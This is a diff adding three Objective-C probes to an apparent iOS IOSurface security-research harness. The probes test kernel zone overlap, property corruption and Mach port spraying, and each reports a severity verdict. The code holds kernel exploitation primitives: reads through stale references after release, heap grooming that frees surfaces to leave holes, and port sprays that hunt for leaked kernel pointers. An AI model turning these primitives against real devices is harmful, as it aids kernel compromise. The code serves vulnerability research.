@@ -9277,3 +9277,673 @@ void iosurface_research_rw_primitive(ISRLogBlock _Nonnull log, ISRDoneBlock _Non
         }
     });
 }
+
+#pragma mark - Probe 43: Kalloc Zone Overlap
+
+void iosurface_research_kalloc_overlap(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"KALLOC: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
+            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
+            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
+            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");
+
+            if (!createPort || !lookupPort) {
+                log(@"KALLOC: Missing mach port APIs");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"KALLOC: Starting kalloc zone overlap probe");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            // Cleanup variables declared before any if-blocks
+            IOSurfaceRef surf = NULL;
+            IOSurfaceRef hijackRef = NULL;
+            mach_port_t hijackPort = MACH_PORT_NULL;
+            mach_port_t *sprayPorts = NULL;
+            int sprayCount = 0;
+            const int SPRAY_SIZE = 500;
+            sprayPorts = (mach_port_t *)calloc(SPRAY_SIZE, sizeof(mach_port_t));
+
+            // Step 1: Create small surface (16x16 = 1024 bytes backing)
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @16, @"IOSurfaceHeight": @16,
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfaceBytesPerRow": @64,
+                @"IOSurfaceAllocSize": @1024
+            };
+            surf = sym.create((__bridge CFDictionaryRef)props);
+            if (!surf) {
+                log(@"KALLOC: Failed to create surface");
+                if (sprayPorts) free(sprayPorts);
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+            log([NSString stringWithFormat:@"KALLOC: Surface created ID=%u allocSize=%zu",
+                sym.getID(surf), sym.getAllocSize(surf)]);
+
+            // Step 2: Write canary pattern
+            sym.lock(surf, 0, NULL);
+            uint32_t *base = (uint32_t *)sym.getBase(surf);
+            if (base) {
+                for (int i = 0; i < 256; i++) base[i] = 0x4B414C4C;
+            }
+            sym.unlock(surf, 0, NULL);
+            log(@"KALLOC: Canary 0x4B414C4C written to all uint32s");
+
+            if (!isr_stopped()) {
+            log(@"KALLOC: Step 3 — Mach port hijack ref");
+            hijackPort = createPort(surf);
+            if (hijackPort != MACH_PORT_NULL) {
+                hijackRef = lookupPort(hijackPort);
+                if (hijackRef) {
+                    anomalies++;
+                    log([NSString stringWithFormat:@"KALLOC: *** Hijack ref obtained ID=%u ***", sym.getID(hijackRef)]);
+                }
+            }
+
+            if (!isr_stopped()) {
+            log(@"KALLOC: Step 4 — Release original surface");
+            CFRelease(surf);
+            surf = NULL;
+
+            if (!isr_stopped()) {
+            log(@"KALLOC: Step 5 — Spray 500 mach ports with messages");
+
+            typedef struct {
+                mach_msg_header_t header;
+                uint32_t data[16];
+            } SimpleMsg;
+
+            for (int i = 0; i < SPRAY_SIZE && !isr_stopped(); i++) {
+                mach_port_t port = MACH_PORT_NULL;
+                kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+                if (kr == KERN_SUCCESS) {
+                    sprayPorts[sprayCount++] = port;
+
+                    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+
+                    SimpleMsg msg = {0};
+                    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                    msg.header.msgh_size = sizeof(msg);
+                    msg.header.msgh_remote_port = port;
+                    msg.header.msgh_local_port = MACH_PORT_NULL;
+                    for (int j = 0; j < 16; j++) msg.data[j] = 0xDEADFACE;
+                    mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                }
+            }
+            log([NSString stringWithFormat:@"KALLOC: Sprayed %d ports with 0xDEADFACE messages", sprayCount]);
+
+            if (!isr_stopped()) {
+            log(@"KALLOC: Step 6 — Read via hijack ref, check for kernel data");
+            int canaryCount = 0;
+            int zeroCount = 0;
+            int otherCount = 0;
+            int pointerLikeCount = 0;
+            uint32_t firstOther = 0;
+
+            if (hijackRef) {
+                sym.lock(hijackRef, 0, NULL);
+                uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
+                if (hb) {
+                    for (int i = 0; i < 256; i++) {
+                        uint32_t val = hb[i];
+                        if (val == 0x4B414C4C) {
+                            canaryCount++;
+                        } else if (val == 0x00000000) {
+                            zeroCount++;
+                        } else {
+                            otherCount++;
+                            if (firstOther == 0) firstOther = val;
+                            if ((val & 0xFFFF0000) == 0xFFFF0000 ||
+                                (val & 0xFFFFF000) == 0xFFFFF000) {
+                                pointerLikeCount++;
+                            }
+                        }
+                    }
+                } else {
+                    anomalies++;
+                    log(@"KALLOC: *** Base address NULL — surface backing may have been reclaimed ***");
+                }
+                sym.unlock(hijackRef, 0, NULL);
+            }
+
+            log([NSString stringWithFormat:@"KALLOC: canary=%d zero=%d other=%d pointerLike=%d firstOther=0x%08X",
+                canaryCount, zeroCount, otherCount, pointerLikeCount, firstOther]);
+
+            if (otherCount > 0) {
+                anomalies++;
+                log([NSString stringWithFormat:@"KALLOC: *** CANARY OVERWRITTEN — %d words replaced, possible kernel data ***", otherCount]);
+            }
+            if (pointerLikeCount > 0) {
+                anomalies++;
+                log([NSString stringWithFormat:@"KALLOC: *** POINTER-LIKE VALUES FOUND — %d potential kernel pointers ***", pointerLikeCount]);
+            }
+
+            } // end step 6
+            } // end step 5
+            } // end step 4
+            } // end step 3
+
+            // Cleanup
+            for (int i = 0; i < sprayCount; i++) {
+                mach_port_destroy(mach_task_self(), sprayPorts[i]);
+            }
+            if (sprayPorts) free(sprayPorts);
+            if (hijackRef) CFRelease(hijackRef);
+            if (hijackPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), hijackPort);
+            if (surf) CFRelease(surf);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"KALLOC: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 4) verdict = @"CRITICAL — kernel data leaked into surface mapping";
+            else if (anomalies >= 2) verdict = @"HIGH — canary overwritten, possible zone overlap";
+            else if (anomalies >= 1) verdict = @"MEDIUM — hijack ref survives release";
+            else verdict = @"LOW — mitigations effective";
+            log([NSString stringWithFormat:@"KALLOC: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-KallocOverlap-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 44: Property Kernel Corruption
+
+void iosurface_research_property_corrupt(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"PROPCORR: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            typedef void (*RemoveValueFn)(IOSurfaceRef, CFStringRef);
+            typedef CFDictionaryRef (*CopyAllValuesFn)(IOSurfaceRef);
+
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+            RemoveValueFn removeValue = (RemoveValueFn)dlsym(sym.iosurface, "IOSurfaceRemoveValue");
+            CopyAllValuesFn copyAllValues = (CopyAllValuesFn)dlsym(sym.iosurface, "IOSurfaceCopyAllValues");
+
+            if (!setValue || !copyValue || !removeValue || !copyAllValues) {
+                log(@"PROPCORR: Missing property APIs");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"PROPCORR: Starting property kernel corruption probe");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            IOSurfaceRef surf = NULL;
+            NSDictionary *params = isr_default_surface_params(64, 64);
+            surf = sym.create((__bridge CFDictionaryRef)params);
+            if (!surf) {
+                log(@"PROPCORR: Failed to create surface");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+            log([NSString stringWithFormat:@"PROPCORR: Surface created ID=%u", sym.getID(surf)]);
+
+            // Test A — Property count stress: 1000 properties
+            if (!isr_stopped()) {
+            log(@"PROPCORR: Test A — Setting 1000 properties");
+            int propsSet = 0;
+            for (int i = 0; i < 1000 && !isr_stopped(); i++) {
+                NSString *key = [NSString stringWithFormat:@"prop_%04d", i];
+                NSNumber *val = @(i);
+                setValue(surf, (__bridge CFStringRef)key, (__bridge CFTypeRef)val);
+                propsSet++;
+            }
+            CFDictionaryRef allProps = copyAllValues(surf);
+            int propCount = allProps ? (int)CFDictionaryGetCount(allProps) : 0;
+            if (allProps) CFRelease(allProps);
+            log([NSString stringWithFormat:@"PROPCORR: Set %d, recovered %d properties", propsSet, propCount]);
+            if (propCount < propsSet) {
+                anomalies++;
+                log([NSString stringWithFormat:@"PROPCORR: *** PROPERTY COUNT MISMATCH — lost %d properties ***", propsSet - propCount]);
+            }
+
+            if (!isr_stopped()) {
+            // Test B — Large value stress: 1MB NSData
+            log(@"PROPCORR: Test B — 1MB property value");
+            size_t bigSize = 1024 * 1024;
+            uint8_t *bigBuf = (uint8_t *)malloc(bigSize);
+            if (bigBuf) {
+                memset(bigBuf, 0xAB, bigSize);
+                bigBuf[0] = 0x42;
+                bigBuf[bigSize - 1] = 0x42;
+                CFDataRef bigData = CFDataCreate(kCFAllocatorDefault, bigBuf, bigSize);
+                if (bigData) {
+                    setValue(surf, CFSTR("big_value"), bigData);
+                    CFTypeRef readBack = copyValue(surf, CFSTR("big_value"));
+                    if (readBack && CFGetTypeID(readBack) == CFDataGetTypeID()) {
+                        CFDataRef readData = (CFDataRef)readBack;
+                        CFIndex readLen = CFDataGetLength(readData);
+                        const uint8_t *readBytes = CFDataGetBytePtr(readData);
+                        BOOL intact = (readLen == (CFIndex)bigSize &&
+                                      readBytes[0] == 0x42 &&
+                                      readBytes[bigSize - 1] == 0x42);
+                        log([NSString stringWithFormat:@"PROPCORR: 1MB readback len=%ld intact=%d", (long)readLen, intact]);
+                        if (!intact) {
+                            anomalies++;
+                            log(@"PROPCORR: *** LARGE VALUE CORRUPTION DETECTED ***");
+                        }
+                    } else {
+                        anomalies++;
+                        log(@"PROPCORR: *** 1MB value could not be read back ***");
+                    }
+                    if (readBack) CFRelease(readBack);
+                    CFRelease(bigData);
+                }
+                free(bigBuf);
+            }
+
+            if (!isr_stopped()) {
+            // Test C — Rapid set/remove cycle
+            log(@"PROPCORR: Test C — 10000 rapid set/remove cycles");
+            CFAbsoluteTime cycleStart = CFAbsoluteTimeGetCurrent();
+            for (int i = 0; i < 10000 && !isr_stopped(); i++) {
+                NSNumber *val = @(i);
+                setValue(surf, CFSTR("cycle_key"), (__bridge CFTypeRef)val);
+                removeValue(surf, CFSTR("cycle_key"));
+            }
+            double cycleElapsed = CFAbsoluteTimeGetCurrent() - cycleStart;
+            log([NSString stringWithFormat:@"PROPCORR: 10000 set/remove cycles in %.3fs (%.0f ops/sec)",
+                cycleElapsed, 20000.0 / cycleElapsed]);
+
+            if (!isr_stopped()) {
+            // Test D — Type confusion
+            log(@"PROPCORR: Test D — Type confusion test");
+            BOOL typeConfusion = NO;
+            for (int i = 0; i < 100 && !isr_stopped(); i++) {
+                setValue(surf, CFSTR("type_test"), (__bridge CFTypeRef)@(i));
+                setValue(surf, CFSTR("type_test"), (__bridge CFTypeRef)@"string_val");
+                setValue(surf, CFSTR("type_test"), (__bridge CFTypeRef)[@"data" dataUsingEncoding:NSUTF8StringEncoding]);
+                setValue(surf, CFSTR("type_test"), (__bridge CFTypeRef)@{@"k": @"v"});
+
+                CFTypeRef readBack = copyValue(surf, CFSTR("type_test"));
+                if (readBack) {
+                    CFTypeID tid = CFGetTypeID(readBack);
+                    if (tid != CFDictionaryGetTypeID()) {
+                        typeConfusion = YES;
+                    }
+                    CFRelease(readBack);
+                }
+            }
+            if (typeConfusion) {
+                anomalies++;
+                log(@"PROPCORR: *** TYPE CONFUSION — last-set type not consistent ***");
+            } else {
+                log(@"PROPCORR: Type consistency OK");
+            }
+
+            if (!isr_stopped()) {
+            // Test E — Reserved key probing
+            log(@"PROPCORR: Test E — Reserved key override attempt");
+            NSArray *reservedKeys = @[@"IOSurfaceAllocSize", @"IOSurfaceWidth", @"IOSurfaceHeight",
+                                      @"IOSurfaceBytesPerRow", @"IOSurfacePixelFormat", @"IOSurfaceBytesPerElement"];
+            size_t origWidth = sym.getWidth(surf);
+            size_t origHeight = sym.getHeight(surf);
+            size_t origAlloc = sym.getAllocSize(surf);
+
+            for (NSString *key in reservedKeys) {
+                if (isr_stopped()) break;
+                setValue(surf, (__bridge CFStringRef)key, (__bridge CFTypeRef)@(99999));
+                CFTypeRef readBack = copyValue(surf, (__bridge CFStringRef)key);
+                if (readBack) {
+                    if (CFGetTypeID(readBack) == CFNumberGetTypeID()) {
+                        int val = 0;
+                        CFNumberGetValue((CFNumberRef)readBack, kCFNumberIntType, &val);
+                        if (val == 99999) {
+                            anomalies++;
+                            log([NSString stringWithFormat:@"PROPCORR: *** RESERVED KEY OVERRIDE — %@ accepted value 99999 ***", key]);
+                        }
+                    }
+                    CFRelease(readBack);
+                }
+            }
+
+            size_t newWidth = sym.getWidth(surf);
+            size_t newHeight = sym.getHeight(surf);
+            size_t newAlloc = sym.getAllocSize(surf);
+            if (newWidth != origWidth || newHeight != origHeight || newAlloc != origAlloc) {
+                anomalies++;
+                log([NSString stringWithFormat:@"PROPCORR: *** INTERNAL STATE CHANGED — w:%zu->%zu h:%zu->%zu alloc:%zu->%zu ***",
+                    origWidth, newWidth, origHeight, newHeight, origAlloc, newAlloc]);
+            } else {
+                log(@"PROPCORR: Reserved key override did not change internal dimensions");
+            }
+
+            // Final property count
+            CFDictionaryRef finalProps = copyAllValues(surf);
+            int finalCount = finalProps ? (int)CFDictionaryGetCount(finalProps) : 0;
+            if (finalProps) CFRelease(finalProps);
+            log([NSString stringWithFormat:@"PROPCORR: Final property count=%d", finalCount]);
+
+            } // end step E
+            } // end step D
+            } // end step C
+            } // end step B
+            } // end step A
+
+            // Cleanup
+            if (surf) CFRelease(surf);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"PROPCORR: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 4) verdict = @"CRITICAL — kernel property dictionary corrupted";
+            else if (anomalies >= 2) verdict = @"HIGH — property storage anomalies detected";
+            else if (anomalies >= 1) verdict = @"MEDIUM — minor property anomaly";
+            else verdict = @"LOW — property handling robust";
+            log([NSString stringWithFormat:@"PROPCORR: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-PropertyCorrupt-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 45: Mach Port Kernel Spray
+
+void iosurface_research_port_kernel_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"PORTKSPRAY: Failed to load symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
+            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
+            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
+            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");
+
+            if (!createPort || !lookupPort) {
+                log(@"PORTKSPRAY: Missing mach port APIs");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"PORTKSPRAY: Starting mach port kernel spray probe");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            // All cleanup variables declared up front
+            const int TOTAL_SURFACES = 100;
+            const int FENCE_LOW = 10;
+            const int FENCE_HIGH = 90;
+            const int SPRAY_PORTS = 1000;
+
+            IOSurfaceRef *surfaces = (IOSurfaceRef *)calloc(TOTAL_SURFACES, sizeof(IOSurfaceRef));
+            mach_port_t *surfPorts = (mach_port_t *)calloc(TOTAL_SURFACES, sizeof(mach_port_t));
+            uint32_t *surfIDs = (uint32_t *)calloc(TOTAL_SURFACES, sizeof(uint32_t));
+            mach_port_t *sprayPorts = (mach_port_t *)calloc(SPRAY_PORTS, sizeof(mach_port_t));
+            int sprayCount = 0;
+            double *preSprayTimes = (double *)calloc(TOTAL_SURFACES, sizeof(double));
+            double *postSprayTimes = (double *)calloc(TOTAL_SURFACES, sizeof(double));
+
+            if (!surfaces || !surfPorts || !surfIDs || !sprayPorts || !preSprayTimes || !postSprayTimes) {
+                log(@"PORTKSPRAY: Allocation failed");
+                if (surfaces) free(surfaces);
+                if (surfPorts) free(surfPorts);
+                if (surfIDs) free(surfIDs);
+                if (sprayPorts) free(sprayPorts);
+                if (preSprayTimes) free(preSprayTimes);
+                if (postSprayTimes) free(postSprayTimes);
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            for (int i = 0; i < TOTAL_SURFACES; i++) surfPorts[i] = MACH_PORT_NULL;
+
+            // Step 1: Create 100 identical small surfaces
+            log(@"PORTKSPRAY: Step 1 — Creating 100 surfaces (4x4 BGRA)");
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @4, @"IOSurfaceHeight": @4,
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfaceBytesPerRow": @16,
+                @"IOSurfaceAllocSize": @64
+            };
+            int created = 0;
+            for (int i = 0; i < TOTAL_SURFACES && !isr_stopped(); i++) {
+                surfaces[i] = sym.create((__bridge CFDictionaryRef)props);
+                if (surfaces[i]) {
+                    surfIDs[i] = sym.getID(surfaces[i]);
+                    // Write unique canary per surface
+                    sym.lock(surfaces[i], 0, NULL);
+                    uint32_t *b = (uint32_t *)sym.getBase(surfaces[i]);
+                    if (b) for (int j = 0; j < 16; j++) b[j] = 0xFE000000 | i;
+                    sym.unlock(surfaces[i], 0, NULL);
+                    created++;
+                }
+            }
+            log([NSString stringWithFormat:@"PORTKSPRAY: Created %d surfaces", created]);
+
+            if (!isr_stopped()) {
+            // Step 2: Create mach ports for all surfaces
+            log(@"PORTKSPRAY: Step 2 — Creating mach ports for all surfaces");
+            int portsCreated = 0;
+            for (int i = 0; i < TOTAL_SURFACES && !isr_stopped(); i++) {
+                if (surfaces[i]) {
+                    surfPorts[i] = createPort(surfaces[i]);
+                    if (surfPorts[i] != MACH_PORT_NULL) portsCreated++;
+                }
+            }
+            log([NSString stringWithFormat:@"PORTKSPRAY: %d mach ports created", portsCreated]);
+
+            // Measure pre-spray timing on fence surfaces
+            for (int i = 0; i < FENCE_LOW && !isr_stopped(); i++) {
+                if (surfaces[i]) {
+                    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
+                    sym.lock(surfaces[i], 0, NULL);
+                    sym.unlock(surfaces[i], 0, NULL);
+                    preSprayTimes[i] = CFAbsoluteTimeGetCurrent() - t0;
+                }
+            }
+
+            if (!isr_stopped()) {
+            // Step 3: Release surfaces 10-89 (create 80 holes)
+            log(@"PORTKSPRAY: Step 3 — Releasing surfaces 10-89 (80 holes)");
+            for (int i = FENCE_LOW; i < FENCE_HIGH && !isr_stopped(); i++) {
+                if (surfaces[i]) {
+                    CFRelease(surfaces[i]);
+                    surfaces[i] = NULL;
+                }
+            }
+            log(@"PORTKSPRAY: 80 surfaces released");
+
+            if (!isr_stopped()) {
+            // Step 4: Spray 1000 mach ports
+            log(@"PORTKSPRAY: Step 4 — Spraying 1000 mach ports");
+            for (int i = 0; i < SPRAY_PORTS && !isr_stopped(); i++) {
+                mach_port_t port = MACH_PORT_NULL;
+                kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+                if (kr == KERN_SUCCESS) {
+                    sprayPorts[sprayCount++] = port;
+                }
+            }
+            log([NSString stringWithFormat:@"PORTKSPRAY: Sprayed %d mach ports", sprayCount]);
+
+            if (!isr_stopped()) {
+            // Step 5: Check fence surfaces for corruption
+            log(@"PORTKSPRAY: Step 5 — Checking fence surfaces for corruption");
+            int fenceCorrupted = 0;
+            int pointerLikeValues = 0;
+
+            for (int i = 0; i < TOTAL_SURFACES && !isr_stopped(); i++) {
+                if (i >= FENCE_LOW && i < FENCE_HIGH) continue;
+                if (!surfaces[i]) continue;
+
+                sym.lock(surfaces[i], 0, NULL);
+                uint32_t *b = (uint32_t *)sym.getBase(surfaces[i]);
+                if (b) {
+                    uint32_t expectedCanary = 0xFE000000 | i;
+                    for (int j = 0; j < 16; j++) {
+                        uint32_t val = b[j];
+                        if (val != expectedCanary && val != 0) {
+                            fenceCorrupted++;
+                            if ((val & 0xFFFF0000) == 0xFFFF0000 ||
+                                (val & 0xFFFFF000) == 0xFFFFF000) {
+                                pointerLikeValues++;
+                            }
+                            if (fenceCorrupted <= 3) {
+                                log([NSString stringWithFormat:@"PORTKSPRAY: *** Fence surface %d word %d: expected 0x%08X got 0x%08X ***",
+                                    i, j, expectedCanary, val]);
+                            }
+                        }
+                    }
+                }
+                sym.unlock(surfaces[i], 0, NULL);
+
+                // Post-spray timing
+                CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
+                sym.lock(surfaces[i], 0, NULL);
+                sym.unlock(surfaces[i], 0, NULL);
+                postSprayTimes[i] = CFAbsoluteTimeGetCurrent() - t0;
+            }
+
+            if (fenceCorrupted > 0) {
+                anomalies++;
+                log([NSString stringWithFormat:@"PORTKSPRAY: *** FENCE CORRUPTION — %d words changed ***", fenceCorrupted]);
+            }
+            if (pointerLikeValues > 0) {
+                anomalies++;
+                log([NSString stringWithFormat:@"PORTKSPRAY: *** %d POINTER-LIKE VALUES in fence surfaces ***", pointerLikeValues]);
+            }
+
+            if (!isr_stopped()) {
+            // Step 6: Try stale port lookups for released surfaces
+            log(@"PORTKSPRAY: Step 6 — Stale port lookups for released surfaces");
+            int staleLookups = 0;
+            for (int i = FENCE_LOW; i < FENCE_HIGH && !isr_stopped(); i++) {
+                if (surfPorts[i] != MACH_PORT_NULL) {
+                    IOSurfaceRef staleRef = lookupPort(surfPorts[i]);
+                    if (staleRef) {
+                        staleLookups++;
+                        if (staleLookups <= 3) {
+                            log([NSString stringWithFormat:@"PORTKSPRAY: *** Stale port lookup succeeded for released surface %d, ID=%u ***",
+                                i, sym.getID(staleRef)]);
+                        }
+                        CFRelease(staleRef);
+                    }
+                }
+            }
+            if (staleLookups > 0) {
+                anomalies++;
+                log([NSString stringWithFormat:@"PORTKSPRAY: *** %d/%d STALE PORT LOOKUPS SUCCEEDED ***", staleLookups, FENCE_HIGH - FENCE_LOW]);
+            } else {
+                log(@"PORTKSPRAY: No stale port lookups succeeded (ports invalidated correctly)");
+            }
+
+            // Step 7: Timing analysis
+            log(@"PORTKSPRAY: Step 7 — Timing analysis");
+            double preAvg = 0, postAvg = 0;
+            int timingCount = 0;
+            for (int i = 0; i < FENCE_LOW; i++) {
+                if (preSprayTimes[i] > 0 && postSprayTimes[i] > 0) {
+                    preAvg += preSprayTimes[i];
+                    postAvg += postSprayTimes[i];
+                    timingCount++;
+                }
+            }
+            if (timingCount > 0) {
+                preAvg /= timingCount;
+                postAvg /= timingCount;
+                double slowdown = (postAvg > 0 && preAvg > 0) ? postAvg / preAvg : 1.0;
+                log([NSString stringWithFormat:@"PORTKSPRAY: Lock/unlock pre=%.6fs post=%.6fs slowdown=%.2fx",
+                    preAvg, postAvg, slowdown]);
+                if (slowdown > 2.0) {
+                    anomalies++;
+                    log([NSString stringWithFormat:@"PORTKSPRAY: *** TIMING ANOMALY — %.2fx slowdown suggests allocator stress ***", slowdown]);
+                }
+            }
+
+            } // end step 6
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+
+            // Cleanup
+            for (int i = 0; i < sprayCount; i++) {
+                mach_port_destroy(mach_task_self(), sprayPorts[i]);
+            }
+            for (int i = 0; i < TOTAL_SURFACES; i++) {
+                if (surfPorts[i] != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), surfPorts[i]);
+                if (surfaces[i]) CFRelease(surfaces[i]);
+            }
+            free(surfaces);
+            free(surfPorts);
+            free(surfIDs);
+            free(sprayPorts);
+            free(preSprayTimes);
+            free(postSprayTimes);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"PORTKSPRAY: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 4) verdict = @"CRITICAL — kernel zone overlap with mach ports detected";
+            else if (anomalies >= 2) verdict = @"HIGH — spray affects surface zone";
+            else if (anomalies >= 1) verdict = @"MEDIUM — minor spray anomaly";
+            else verdict = @"LOW — zone separation effective";
+            log([NSString stringWithFormat:@"PORTKSPRAY: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-PortKernelSpray-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
